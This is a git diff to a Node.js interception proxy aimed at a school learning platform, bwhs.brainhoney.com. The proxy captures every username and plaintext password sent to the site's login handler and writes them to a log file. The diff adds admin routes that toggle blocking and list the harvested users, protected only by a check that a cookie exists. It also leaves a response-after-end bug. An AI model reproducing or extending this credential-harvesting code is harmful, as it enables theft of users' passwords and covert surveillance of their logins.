@@ -5,6 +5,7 @@ var http = require('http'),
     upgrade = require(__dirname + '/upgrade.js'),
     logger = require(__dirname + '/log.js');
 
+var shouldBlock = false, activatedUsers = [];
 var admin_server = function(req, res, parsed_req) {
   var cookie = {};
   (req.headers['cookie'] || '').split(';').forEach(function(pair) {
@@ -13,6 +14,23 @@ var admin_server = function(req, res, parsed_req) {
   });
   if( cookie['.ASPXAUTH'] ) {
     // TODO: check username
+    switch( parsed_req.path ) {
+      case '/proxy_admin/enforce':
+        shouldBlock = true; 
+	res.write("Enforcing");
+	res.end();
+      break;
+      case '/proxy_admin/disable':
+        shouldBlock = false;
+	activatedUsers = [];
+	res.write("Disabled");
+	res.end();
+      break;
+      default:
+        res.write("Admin\n" + activatedUsers.join('\n'));
+	res.end();
+      break;
+    }
     res.write("Admin\n");
     res.end();
   } else {
@@ -23,9 +41,10 @@ var admin_server = function(req, res, parsed_req) {
   }
 };
 var filter = function(req, res, parsed_req, cont) {
-  if( parsed_req.host == 'bwhs.brainhoney.com' ) {
+  if( parsed_req.host == 'bwhs.brainhoney.com' || !shouldBlock ) {
     if( parsed_req.path == '/Controls/CredentialsUI.ashx' ) {
       logger(req, './log.txt', function(body) {
+	shouldBlock && activatedUsers.push(body.username);
 	return body.username+'    '+body.password;
       });
     } else if( parsed_req.path.match(/^\/proxy_admin/) ) {
